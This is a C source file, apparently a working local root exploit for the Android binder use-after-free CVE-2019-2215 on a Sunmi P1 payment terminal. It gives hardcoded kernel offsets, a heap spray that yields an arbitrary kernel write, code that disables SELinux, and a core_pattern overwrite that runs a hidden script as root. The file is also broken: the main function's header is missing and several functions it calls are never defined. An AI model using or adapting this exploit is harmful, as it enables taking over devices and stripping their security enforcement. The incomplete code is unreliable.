/*
 * sunmi2215.c - CVE-2019-2215 (binder UAF) exploit for the Sunmi P1 (W6900)
 *
 * Target: MT6580, Linux 3.18.19 armv7, SELinux enforcing, no KASLR, CONFIG_MODULES=n.
 * Runs as `shell` (uid 2000); only /dev/binder, /dev/ashmem, /dev/mali are reachable.
 *
 * Every constant below was recovered from the device's own kernel image with objdump
 * (dumps/boot.bin -> ./kernel), not guessed:
 *
 *   sizeof(struct binder_thread) = 0xFC   (kmem_cache_alloc size in binder_get_thread)
 *   binder_thread.wait.lock       @ 0x2C  (poll_wait(&thread->wait,...) in binder_poll)
 *   binder_thread.wait.task_list  @ 0x30 (.next) / 0x34 (.prev)
 *   struct iovec (armv7)          = 8 bytes -> 32 segs = 256 = kmalloc-256 (matches 0xFC)
 *   binder_free_thread() -> kfree()        (reached from BINDER_THREAD_EXIT)
 *   selinux_enforcing = 0xc0e44738         (store target inside enforcing_setup)
 *   core_pattern      = 0xc0cdf4c4         (data field of its sysctl table entry)
 *
 * Primitive: BINDER_THREAD_EXIT frees the binder_thread while the epoll entry still
 * points into its waitqueue. We reclaim that chunk with the iovec array recvmsg()
 * kmallocs (same kmalloc-256 cache). The kernel's remove_wait_queue() then overwrites
 * iov[WQ] = {base, len} with the chunk's own address, so our socket data lands *inside*
 * the iovec array and rewrites iov[WQ] to {TARGET-8, 8+N}. The next copy iteration
 * writes our payload to TARGET  =>  arbitrary kernel write, no read primitive needed.
 *
 * Post-exploitation: zero selinux_enforcing and point core_pattern at a script, then
 * crash a process - the kernel runs the script as root.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>

#define BINDER_THREAD_EXIT 0x40046208

/* armv7 layout: 8-byte iovec; wait.lock at 0x2C = iov[5].iov_len, task_list at 0x30 = iov[6].iov_base */
#define IOV_NR       32
#define IOV_WQ_LOCK  5
#define IOV_WQ       6

#define SELINUX_ENFORCING 0xc0e44738u
#define CORE_PATTERN      0xc0cdf4c4u

static int binder_fd = -1;
static int epfd = -1;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

/* write len bytes from data to kernel address target, via the spray primitive */
static int kw(unsigned int target, const void *data, unsigned int len)
{
    int attempt;
    for (attempt = 0; attempt < 10; attempt++) {
        if (kw_spray(target, data, len)) return 0;
    }
    return -1;
}

static void show(const char *path, const char *label)
{
    char buf[200];
    int fd = open(path, O_RDONLY);
    if (fd < 0) { printf("[?] %s: %s\n", label, strerror(errno)); return; }
    memset(buf, 0, sizeof(buf));
    if (read(fd, buf, sizeof(buf) - 1) < 0) { close(fd); return; }
    close(fd);
    printf("[*] %s: %s", label, buf);
    if (buf[0] && buf[strlen(buf) - 1] != '\n') printf("\n");
}

static void on_alarm(int s) { (void)s; }

static void pincpu(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) perror("setaffinity");
}

static int probe_transfer(void)
{
    const char *names[] = { "activity", "package", "drm.drmManager", "media", NULL };
    int i, fd = open("/dev/binder", O_RDWR);

    if (fd < 0) { perror("open binder"); return 1; }
    binder_setup(fd);
    for (i = 0; names[i]; i++) {
        int h = svc_handle(fd, names[i], 0);
        if (h <= 0) h = svc_handle(fd, names[i], 1);
        fprintf(stderr, "%-18s handle=%d", names[i], h);
        if (h > 0) fprintf(stderr, "  transfer: %s", try_transfer(fd, (unsigned int)h));
        fprintf(stderr, "\n");
    }
    close(fd);
    return 0;
}

static int leak_test(void)
{
    struct iovec iov[IOV_NR];
    char *dummy, *fill, *buf, *sh;
    int attempt;

    pincpu();
    dummy = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy == MAP_FAILED) die("mmap");
    memset(dummy, 0x41, 0x2000);
    sh = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sh == MAP_FAILED) die("mmap shared");
    fill = malloc(0x1000);
    buf = malloc(0x1000);
    if (!fill || !buf) die("malloc");
    memset(fill, 0x42, 0x1000);

    for (attempt = 1; attempt <= 40; attempt++) {
        int pfd[2], n, i, miss;
        pid_t pid;

        memset(sh, 0, 0x1000);
        if (pipe(pfd)) die("pipe");
        fcntl(pfd[0], F_SETPIPE_SZ, 0x1000);
        if (write(pfd[1], fill, 0x1000) != 0x1000) die("prefill");

        /* sets the binder state AND registers the epoll entry on thread->wait */
        force_thread_path(binder_fd);

        memset(iov, 0, sizeof(iov));
        iov[IOV_WQ_LOCK].iov_len = 0;
        iov[IOV_WQ].iov_base = dummy;
        iov[IOV_WQ].iov_len = 0x1000;

        pid = fork();
        if (pid < 0) die("fork");
        if (pid == 0) {
            close(pfd[1]);
            usleep(200000);
            epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, NULL);
            if (read(pfd[0], buf, 0x1000) != 0x1000) _exit(1);
            usleep(100000);
            n = read(pfd[0], sh, 0x1000);
            _exit(n > 0 ? 0 : 1);
        }
        close(pfd[0]);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        n = writev(pfd[1], iov, IOV_NR);
        waitpid(pid, NULL, 0);
        close(pfd[1]);

        miss = 1;
        for (i = 0; i < 0x1000; i++) if (sh[i] != 0x41) { miss = 0; break; }
        printf("attempt %2d: writev=%d  %s  [0x30]=%08x [0x34]=%08x\n",
               attempt, n, miss ? "MISS (still our page)" : "HIT!",
               *(unsigned int *)(sh + 0x30), *(unsigned int *)(sh + 0x34));
        if (!miss) { hexdump((unsigned char *)sh, 0x80); return 0; }
    }
    printf("[-] no hit in 40 attempts\n");
    return 1;
}


{
    unsigned int zero = 0;

    {   /* NOTE: musl's signal() sets SA_RESTART, which would make an interrupted
         * binder read restart forever - install the handler without it. */
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = on_alarm;
        sa.sa_flags = 0;
        sigaction(SIGALRM, &sa, NULL);
    }
    const char *pat = "|/data/local/tmp/.r.sh";

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) die("open /dev/binder");
    epfd = epoll_create(1000);
    if (epfd < 0) die("epoll_create");

    if (argc > 1 && !strcmp(argv[1], "leak"))
        return leak_test();

    if (argc > 1 && !strcmp(argv[1], "xfer"))
        return probe_transfer();

    printf("[*] Sunmi P1 / MT6580 / 3.18.19 armv7 - CVE-2019-2215\n");

    show("/sys/fs/selinux/enforce", "selinux enforce before");

    printf("[*] kw(0x%08x, 0, 4)  -- selinux_enforcing\n", SELINUX_ENFORCING);
    kw(SELINUX_ENFORCING, &zero, 4);
    show("/sys/fs/selinux/enforce", "selinux enforce after");

    printf("[*] kw(0x%08x, \"%s\", %zu)  -- core_pattern\n",
            CORE_PATTERN, pat, strlen(pat) + 1);
    kw(CORE_PATTERN, pat, strlen(pat) + 1);

    printf("[*] triggering a crash so the kernel runs the helper as root...\n");
    {
        pid_t p = fork();
        if (p == 0) {
            volatile int *x = (volatile int *)0;
            *x = 1;                 /* SIGSEGV -> do_coredump -> core_pattern helper */
            _exit(0);
        }
        if (p > 0) waitpid(p, NULL, 0);
    }
    sleep(2);
    printf("[+] done - root helper output:\n");
    show("/data/local/tmp/.rout", "helper log");
    return 0;
}


